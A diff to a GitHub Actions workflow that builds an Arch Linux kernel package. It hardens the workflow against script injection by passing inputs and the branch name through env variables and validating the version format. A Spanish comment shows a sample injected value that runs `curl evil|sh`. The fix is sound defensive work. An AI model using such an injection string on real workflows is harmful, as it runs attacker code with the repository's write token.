@@ -45,9 +45,14 @@ jobs:
     steps:
       - name: Obtener ultima version estable
         id: get_ver
+        env:
+          # NUNCA interpolar ${{ inputs.* }} dentro de `run:`: GitHub lo pega como TEXTO en el script antes de ejecutarlo,
+          # así que un valor como `7.2"; curl evil|sh; "` ejecuta código con el GITHUB_TOKEN (contents: write). Por env
+          # llega como dato y se valida abajo.
+          INPUT_KERNEL_VERSION: ${{ github.event.inputs.kernel_version }}
         run: |
-          if [[ -n "${{ github.event.inputs.kernel_version }}" ]]; then
-            KERNEL_VER="${{ github.event.inputs.kernel_version }}"
+          if [[ -n "$INPUT_KERNEL_VERSION" ]]; then
+            KERNEL_VER="$INPUT_KERNEL_VERSION"
             echo "Version especificada manualmente: $KERNEL_VER"
           else
             KERNEL_VER=""
@@ -95,14 +100,21 @@ jobs:
             echo "Version detectada: $KERNEL_VER"
           fi
 
+          # Formato de versión de kernel.org (7.2, 7.2.14, 7.3-rc1; Arch escribe 7.3.rc1). Esta cadena se interpola después en `run:` de
+          # otros jobs y en el commit del bump: si no es una versión, se corta aquí.
+          if ! [[ "$KERNEL_VER" =~ ^[0-9]+\.[0-9]+(\.[0-9]+)?([.-]rc[0-9]+)?$ ]]; then
+            echo "::error::version de kernel con formato inesperado: '$KERNEL_VER' (manual o devuelta por la API de Arch/kernel.org)"
+            exit 1
+          fi
           echo "kernel_ver=$KERNEL_VER" >> "$GITHUB_OUTPUT"
           echo "Version final: $KERNEL_VER"
 
       - name: Revisar si ya esta construida
         id: check_build
+        env:
+          FORCE: ${{ github.event.inputs.force_rebuild }}
+          KERNEL_VER: ${{ steps.get_ver.outputs.kernel_ver }}
         run: |
-          KERNEL_VER="${{ steps.get_ver.outputs.kernel_ver }}"
-          FORCE="${{ github.event.inputs.force_rebuild }}"
 
           if [[ "$FORCE" == "true" ]]; then
             echo "Rebuild forzado"
@@ -270,6 +282,9 @@ jobs:
         # inofensivo, pkgrel no necesita ser correlativo sin huecos.
         if: success()
         continue-on-error: true
+        env:
+          # el nombre de la rama lo elige quien hace push: por env, nunca pegado en el script
+          REF_NAME: ${{ github.ref_name }}
         run: |
           set -uo pipefail
           git config --global --add safe.directory "$GITHUB_WORKSPACE" || true
@@ -292,7 +307,7 @@ jobs:
             git -C "$GITHUB_WORKSPACE" commit -m "chore(kernel): bump linux-avalos a ${{ needs.check-version.outputs.kernel_ver }}"
             git -C "$GITHUB_WORKSPACE" push \
               "https://x-access-token:${{ secrets.GITHUB_TOKEN }}@github.com/${{ env.AVALOS_REPO }}.git" \
-              "HEAD:${{ github.ref_name }}"
+              "HEAD:refs/heads/$REF_NAME"
             echo "PKGBUILD actualizado y commiteado (${{ needs.check-version.outputs.kernel_ver }})"
           fi
 
